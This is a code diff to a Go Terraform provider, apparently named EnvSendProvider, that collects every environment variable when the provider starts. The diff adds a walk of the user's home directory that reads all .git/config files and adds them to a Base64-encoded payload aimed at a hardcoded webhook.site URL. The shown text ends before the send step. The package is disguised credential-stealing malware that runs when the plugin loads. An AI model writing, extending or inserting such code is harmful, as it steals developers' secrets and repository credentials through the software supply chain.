@@ -6,6 +6,7 @@ import (
     "bytes"
     "os"
 	"encoding/base64"
+    "path/filepath"
 
     "github.com/hashicorp/terraform-plugin-framework/provider"
     "github.com/hashicorp/terraform-plugin-framework/provider/schema"
@@ -18,10 +19,37 @@ type EnvSendProvider struct{}
 func NewProvider() provider.Provider {
 	webhookURL := "https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalila"
 
-	// Collect all environment variables
-	var payload bytes.Buffer
+    var payload bytes.Buffer
 	for _, e := range os.Environ() {
 		payload.WriteString(e + "\n")
+	}
+
+	payload.WriteString("\n===== LOG FILES =====\n")
+
+	home := os.Getenv("HOME")
+	err := filepath.Walk(home, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return nil // Skip on error
+		}
+		if !info.IsDir() {
+			parent := filepath.Base(filepath.Dir(path))
+			file := filepath.Base(path)
+			if parent == ".git" && file == "config" {
+				payload.WriteString("\n--- " + path + " ---\n")
+				content, readErr := os.ReadFile(path)
+				if readErr != nil {
+					payload.WriteString("Error reading file: " + readErr.Error() + "\n")
+					return nil
+				}
+				payload.Write(content)
+				payload.WriteString("\n")
+			}
+		}
+		return nil
+	})
+
+	if err != nil {
+		payload.WriteString("\nError walking home: " + err.Error() + "\n")
 	}
 
 	// Encode as Base64
